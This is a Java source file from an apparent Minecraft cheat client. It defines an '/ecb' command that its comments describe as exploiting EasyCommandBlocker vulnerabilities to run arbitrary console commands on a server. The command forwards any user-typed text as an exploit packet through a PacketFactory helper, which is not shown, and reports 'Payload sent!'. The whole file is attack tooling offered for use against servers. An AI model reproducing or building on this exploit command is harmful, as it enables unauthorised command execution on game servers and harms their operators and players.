package dev.atlasclient.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import dev.atlasclient.*;
import dev.atlasclient.command.Command;
import dev.atlasclient.command.CommandManager;

/**
 * ECBCommand - Command for exploiting EasyCommandBlocker (ECB) vulnerabilities.
 * This command allows executing console commands through ECB exploit mechanisms.
 */
public class ECBCommand extends Command {
  
    /**
     * Constructor for ECB command.
     * Sets up command name "ecb" and description "Console command execution exploit".
     */
    public ECBCommand() {
        super("ecb", "Console command execution exploit", CommandManager.CommandCategory.EXPLOIT);
    }

    /**
     * Builds the command structure:
     * /ecb <command>
     * Where command is a greedy string that captures all remaining input.
     * 
     * @param root The root literal argument builder to construct the command
     */
    @Override 
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        // Default execution when command is called without arguments - shows incomplete message
        root.executes(this::incompleteCommand)
            // Add greedy string argument for the command to execute
            .then(argument("command", StringArgumentType.greedyString()).executes(context -> {
                // Send ECB exploit packet with the provided command
                PacketFactory.sendECB(context.getArgument("command", String.class));
                // Notify user that payload was sent successfully
                Helper.printChatMessage("Payload sent!");
                // Return success code
                return SINGLE_SUCCESS;
            }));
    }
}
